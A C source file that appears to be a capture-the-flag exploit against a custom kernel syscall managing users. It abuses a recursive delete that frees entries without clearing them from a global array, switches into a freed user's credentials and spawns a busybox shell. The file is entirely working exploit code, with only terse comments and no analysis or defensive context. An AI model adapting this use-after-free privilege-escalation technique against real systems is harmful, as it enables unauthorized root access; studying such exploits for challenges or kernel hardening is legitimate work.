#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/syscall.h>
#include <unistd.h>

#define _DEBUG_NAME(symbol) #symbol
#define _DEBUG_STRING(symbol) _DEBUG_NAME(symbol)
#define DEBUG_CALL(func, ...) \
  printf("%s(): %d\n", _DEBUG_STRING(func), func(__VA_ARGS__))

#define SYS_MAGIC     449
#define MAGIC_ADD     0
#define MAGIC_EDIT    1
#define MAGIC_DELETE  2
#define MAGIC_SWITCH  3

static long sys_add(char* username, char* password) {
  return syscall(SYS_MAGIC, MAGIC_ADD, username, password);
}
static long sys_edit(char* username, char* password) {
  return syscall(SYS_MAGIC, MAGIC_EDIT, username, password);
}
static long sys_delete(char* username) {
  return syscall(SYS_MAGIC, MAGIC_DELETE, username);
}
static long sys_switch(char* username, char* password) {
  return syscall(SYS_MAGIC, MAGIC_SWITCH, username, password);
}

int main(int argc, char** argv) {
  // global: [a], [b], ([c], [d])
  // children:
  // [a] -> [b]
  // [b] -> [c], [d]
  char A[64] = {0}, B[64] = {0}, C[64] = {0};
  memset(A, 'A', 64);
  memset(B, 'B', 64);
  memset(C, 'C', 64);
  DEBUG_CALL(sys_add, &A, &A);
  DEBUG_CALL(sys_switch, &A, NULL);

  DEBUG_CALL(sys_add, &B, &B);
  DEBUG_CALL(sys_switch, &B, NULL);
  DEBUG_CALL(sys_add, &C, &C);


  // recursive delete_user does not remove from global array
  // global: [a], [ ], ([c], [d])
  // children:
  // [a]
  // free(b); free(c); free(d);
  DEBUG_CALL(sys_switch, &A, &A);
  DEBUG_CALL(sys_delete, &B);

  DEBUG_CALL(sys_switch, &C, &C);

  execve("/busybox", (char* const[]){"busybox", "sh"}, NULL);
  return 0;
}
